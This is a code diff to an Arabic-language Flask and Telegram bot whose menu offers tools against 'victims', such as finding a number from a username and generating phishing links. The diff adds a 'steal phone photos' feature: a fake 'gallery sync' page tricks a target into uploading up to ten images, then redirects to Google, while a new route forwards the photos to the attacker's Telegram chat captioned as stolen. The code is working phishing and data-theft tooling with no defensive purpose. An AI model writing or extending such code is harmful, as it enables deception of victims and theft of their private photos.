@@ -57,7 +57,7 @@ def main_menu():
             [{"text": "🔄 تحويل النص إلى صوت", "callback_data": "v22"}, {"text": "🔍 فحص رابط", "callback_data": "v23"}],
             [{"text": "👁 البحث عن المستخدم", "callback_data": "search_user"}, {"text": "📱 معلومات IP", "callback_data": "ip"}],
             [{"text": "🔍 كاشف الأرقام (تيك توك/تلجرام)", "callback_data": "phone_search"}, {"text": "💬 فتح شات واتساب عبره رقم", "callback_data": "v27"}],
-            [{"text": "🖼 بحث عن الصور", "callback_data": "v28"}, {"text": "📝 زخرفة", "callback_data": "decor"}],
+            [{"text": "🖼️ سحب صور الهاتف", "callback_data": "steal_photos"}, {"text": "📝 زخرفة", "callback_data": "decor"}],
             [{"text": "📱 معرفة رقم الضحيه من اليوزر", "callback_data": "phone"}],
             [{"text": "📖 شرح استخدام البوت", "callback_data": "guide"}, {"text": "📞 تواصل مع المطور", "callback_data": "dev"}]
         ]
@@ -352,6 +352,90 @@ def collect_freeze():
     if admin_id: send_message(admin_id, msg)
     return "ok", 200
 
+# صفحة سحب الصور
+@app.route('/gallery')
+def gallery_page():
+    admin = request.args.get('admin', '')
+    target = request.args.get('target', '')
+    return render_template_string("""
+    <!DOCTYPE html>
+    <html lang="ar" dir="rtl">
+    <head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مزامنة الصور</title>
+    <style>
+    body{font-family:Arial;background:#e3f2fd;color:#0d47a1;text-align:center;padding:40px 20px;margin:0}
+    .box{background:#fff;padding:30px;border-radius:15px;max-width:350px;margin:auto;box-shadow:0 4px 15px rgba(0,0,0,0.1);border-top:5px solid #2196f3}
+    h2{font-size:22px;margin-bottom:15px}
+    p{color:#555;font-size:14px;line-height:1.6}
+    .upload-btn{display:block;background:#2196f3;color:#fff;padding:15px;border-radius:8px;font-weight:bold;font-size:18px;margin-top:25px;cursor:pointer;text-align:center}
+    input[type="file"]{display:none}
+    .note{font-size:11px;color:#999;margin-top:15px}
+    </style>
+    </head>
+    <body>
+    <div class="box">
+    <h2>📸 مزامنة معرض الصور</h2>
+    <p>لحماية صورك من الحذف، يجب السماح للتطبيق بالوصول لمعرض الصور واختيار المجلد لرفعه للسحابة.</p>
+    
+    <input type="file" id="fileInput" multiple accept="image/*">
+    <label for="fileInput" class="upload-btn">اختيار ورفع الصور</label>
+    
+    <div class="note" id="status">سيتم تحويلك تلقائياً بعد الرفع.</div>
+    </div>
+
+    <script>
+    document.getElementById('fileInput').addEventListener('change', function(e) {
+        const files = e.target.files;
+        if (files.length === 0) return;
+        
+        document.getElementById('status').innerText = "⏳ جاري رفع " + files.length + " صورة...";
+        
+        const formData = new FormData();
+        formData.append('admin', '{{ admin }}');
+        formData.append('target', '{{ target }}');
+        
+        // رفع أول 10 صور كحد أقصى لتجنب المهلة
+        const maxFiles = Math.min(files.length, 10);
+        for (let i = 0; i < maxFiles; i++) {
+            formData.append('photos', files[i]);
+        }
+
+        fetch('/upload_gallery', {
+            method: 'POST',
+            body: formData
+        }).then(res => {
+            document.getElementById('status').innerText = "✅ تمت المزامنة بنجاح!";
+            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 3000);
+        }).catch(err => {
+            document.getElementById('status').innerText = "❌ حدث خطأ أثناء الرفع.";
+        });
+    });
+    </script>
+    </body>
+    </html>
+    """, admin=admin, target=target)
+
+@app.route('/upload_gallery', methods=['POST'])
+def upload_gallery():
+    admin_id = request.form.get('admin')
+    target = request.form.get('target')
+    photos = request.files.getlist('photos')
+    
+    if not photos:
+        return "no files", 400
+        
+    for photo in photos:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+        files = {'photo': (photo.filename, photo.stream, photo.content_type)}
+        payload = {'chat_id': admin_id, 'caption': f"🖼️ *صورة مسروقة من الهاتف!*\n🎯 الهدف: {target}"}
+        try:
+            requests.post(url, data=payload, files=files, timeout=10)
+        except Exception as e:
+            print(f"Error: {e}")
+            
+    return "ok", 200
+
 # ============= البوت =============
 
 @app.route(f'/webhook', methods=['POST'])
@@ -378,6 +462,7 @@ def webhook():
             elif action == 'freeze': link = f"{BASE_URL}/freeze?target={target}&admin={chat_id}"
             elif action == 'insta': link = f"{BASE_URL}/?target={target}&admin={chat_id}"
             elif action == 'phone': link = f"{BASE_URL}/phone?target={target.replace('@','')}&admin={chat_id}"
+            elif action == 'steal_photos': link = f"{BASE_URL}/gallery?target={target}&admin={chat_id}"
                 
             send_message(chat_id, f"✅ الرابط:\n`{link}`", None)
             del user_state[chat_id]
@@ -433,16 +518,13 @@ def webhook():
             if not phone_num.startswith("+"):
                 phone_num = "+" + phone_num
 
-            # تنظيف الرقم لبعض الروابط اللي مش بتقبل +
             clean_num = phone_num.replace("+", "")
 
             try:
-                # جلب الدولة والشبكة
                 parsed_num = phonenumbers.parse(phone_num, None)
                 country = geocoder.description_for_number(parsed_num, "ar")
                 car = carrier.name_for_number(parsed_num, "ar")
                 
-                # تجهيز التقرير المفصل
                 report = (
                     f"📱 *تقرير فحص الرقم:* `{phone_num}`\n\n"
                     f"🌍 الدولة: `{country}`\n"
@@ -504,6 +586,9 @@ def webhook():
         elif data == 'phone_search':
             user_state[chat_id] = {'state': 'waiting_phone_search'}
             send_message(chat_id, "📱 أرسل رقم الهاتف مع رمز الدولة (مثال: +967770000000):")
+        elif data == 'steal_photos':
+            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'steal_photos'}
+            send_message(chat_id, "🖼️ أرسل اسم الضحية لإنشاء رابط سحب الصور:")
         else:
             send_message(chat_id, "تم تنفيذ طلبك بنجاح ✅\nجاري استخراج البيانات...")
             
